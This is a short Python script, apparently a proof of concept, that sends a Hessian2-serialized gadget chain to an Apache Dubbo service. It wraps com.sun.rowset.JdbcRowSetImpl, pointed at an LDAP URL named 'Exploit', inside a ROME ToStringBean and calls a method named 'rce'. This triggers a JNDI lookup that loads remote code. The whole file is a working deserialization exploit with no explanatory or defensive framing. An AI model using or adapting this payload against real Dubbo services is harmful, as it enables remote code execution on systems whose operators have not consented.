# -*- coding: utf-8 -*-
#pip3 install dubbo-py
from dubbo.codec.hessian2 import Decoder,new_object
from dubbo.client import DubboClient

client = DubboClient('127.0.0.1', 12345)

JdbcRowSetImpl=new_object(
      'com.sun.rowset.JdbcRowSetImpl',
      dataSource="ldap://127.0.0.1:8087/Exploit",
      strMatchColumns=["foo"]
      )
JdbcRowSetImplClass=new_object(
      'java.lang.Class',
      name="com.sun.rowset.JdbcRowSetImpl",
      )
toStringBean=new_object(
      'com.rometools.rome.feed.impl.ToStringBean',
      beanClass=JdbcRowSetImplClass,
      obj=JdbcRowSetImpl
      )

resp = client.send_request_and_return_response(
    service_name='cn.rui0',
    method_name='rce',
    args=[toStringBean])